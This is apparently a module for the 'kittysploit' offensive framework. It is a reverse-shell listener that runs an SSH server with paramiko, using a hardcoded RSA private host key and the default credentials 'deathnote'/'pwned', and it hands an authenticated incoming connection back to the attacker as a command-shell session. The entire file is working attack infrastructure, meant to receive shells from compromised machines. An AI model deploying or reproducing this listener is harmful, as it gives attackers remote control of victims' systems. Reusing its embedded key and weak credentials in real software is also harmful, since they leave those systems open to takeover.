from kittysploit import *
import paramiko
import six
import threading
import socket

class Module(Listener):

	__info__ = {
		"name": "Create ssh server",
  		"description": "Connect to ssh server and spawn a command shell",

		"type": "reverse",
		"session": "shell_subprocess",
	}
	
	lhost = OptString("127.0.0.1", "Target IPv4 or IPv6 address")
	lport = OptPort(2222, "Target HTTP port", "yes")
	username = OptString("deathnote", "username", "yes")
	password = OptString("pwned", "password", "yes")

	def run(self):
		server_host_key = paramiko.RSAKey(file_obj=
		six.StringIO("""-----BEGIN RSA PRIVATE KEY-----
		MIIEogIBAAKCAQEAnahBtR7uxtHmk5UwlFfpC/zxdxjUKPD8UpNOOtIJwpei7gaZ
		+Jgub5GFJtTG6CK+DIZiR4tE9JxMjTEFDCGA3U4C36shHB15Pl3bLx+UxdyFylpc
		c7XYp4fpQjhFUoHOAIl5ZaA223kIxi7sFXtM1Gjy6g49u+G5teVfMbeZnks2xjjy
		F84qVADFBXCsfjrY5m4R+Wnfups/jP1agOpnOvqHlX/bpvzEZRcwJ0A8CylBZzQP
		D1Y4EXy1B4QLyLJKFIMRkWnr0f8rK5Q/obCLTjl+IMmZrkItbfC/hYCy6TDi+Efn
		cgGw02L93Mf6QGDNc21BsRELPYMME22MmpLphQIBIwKCAQEAmScbQjtOWr1GY3r7
		/dG90SGaG+w70AALDmM2DUEQy6k/MF4vLAGMMd3RzfNE4YDV4EgHszbVRWSiIsHn
		pWJf7OyyVZ7s9r2LuO111gFr82iB98V+YcaX8zOSIxIXdLicOwk0GZRSjA8tGErW
		tcg8AYqFkulDSMylxqRN2IZ3+NnTROxh4uUFH57roSYoCvzjM2v1Xa+S42BLpBD1
		3mLAJD36JhOhMTgYUgHAROx9+YUUUzYk3jpkTGWnAYSumnJXQYphLE9zadXxh94N
		HZJdvXajuP5N2M3Q2b4Gbyt2wNFlNcHGA+Zwk8wHIBnY9Sb9Gz0QALsOAwUoRY8T
		rCysSwKBgQDPVjFdSgM3jScmFV9fVnx3iNIlM6Ea7+UCrOOCvcGtzDo5vuTPktw7
		8abHEFHw7VrtxI3lRQ41rlmK3B//Q7b+ZJ0HdZaRdyCqW1u91tq1tQe7yiJBm0c5
		hZ3F0Vr6HAXoBVOux5wUq55jvUJ8dCVYNYfctZducVmOos3toDkSzQKBgQDCqRQ/
		GO5AU3nKfuJ+SZvv8/gV1ki8pGmyxkSebUqZSXFx+rQEQ1e6tZvIz/rYftRkXAyL
		XfzXX8mU1wEci6O1oSLiUBgnT82PtUxlO3Peg1W/cpKAaIFvvOIvUMRGFbzWhuj7
		4p4KJjZWjYkAV2YlZZ8Br23DFFjjCuawX7NhmQKBgHCN4EiV5H09/08wLHWVWYK3
		/Qzhg1fEDpsNZZAd3isluTVKXvRXCddl7NJ2kuHf74hjYvjNt0G2ax9+z4qSeUhF
		P00xNHraRO7D4VhtUiggcemZnZFUSzx7vAxNFCFfq29TWVBAeU0MtRGSoG9yQCiS
		Fo3BqfogRo9Cb8ojxzYXAoGBAIV7QRVS7IPheBXTWXsrKRmRWaiS8AxTe63JyKcm
		XwoGea0+MkwQ67M6s/dqCxgcdGITO81Hw1HbSGYPxj91shYlWb/B5K0+CUyZk3id
		y8vHxcUbXSTZ8ls/sQqAhpZ1Tkn2HBpvglAaM+OUQK/G5vUSe6liWeTawJuvtCEr
		rjRLAoGAUNNY4/7vyYFX6HkX4O2yL/LZiEeR6reI9lrK/rSA0OCg9wvbIpq+0xPG
		jCrc8nTlA0K0LtEnE+4g0an76nSWUNiP4kALROfZpXajRRaWdwFRAO17c9T7Uxc0
		Eez9wYRqHiuvU0rryYvGyokr62w1MtJO0tttnxe1Of6wzb1WeCU=
		-----END RSA PRIVATE KEY-----"""))
		server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)		
		try:
			server_socket.bind((self.lhost, self.lport))
		except:
			print_error(f"Bind Error for SSH Server using {self.lhost}:{server_socket.getsockname()[1]}")
			return False
		print_success(f"Bind Success for SSH Server using {self.lhost}:{server_socket.getsockname()[1]}")
		server_socket.listen(100)
		print_status("Listening")

		client_socket, addr = server_socket.accept()
		print_status(f"Incoming TCP Connection from {addr[0]}:{addr[1]}")

		try:
			ssh_session = paramiko.Transport(client_socket)
			ssh_session.add_server_key(server_host_key)
			server = Server(self.username, self.password)
			try:
				ssh_session.start_server(server=server)
			except paramiko.SSHException:
				print_error("SSH Parameters Negotiation Failed")
				return False
			print_status("SSH Parameters Negotiation Succeeded")
			print_status("Authenticating")
			ssh_channel = ssh_session.accept(20)
			if ssh_channel == None or not ssh_channel.active:
				print_status("SSH Client Authentication Failure")
				ssh_session.close()
			else:
				print_status("SSH Client Authenticated")
				if not ssh_channel.closed:
					return (ssh_channel, addr)
				else:
					return False
		except:
			print("[!] Error closing SSH session")
			return False

class Server(paramiko.ServerInterface):
	def __init__(self, username, password):
		self.event = threading.Event()
		self.username = username
		self.password = password
	def check_auth_password(self, username, password):
		if username == self.username and password == self.password:
			return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED
	def check_channel_request(self, kind, chanid):
		if kind == "session":
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
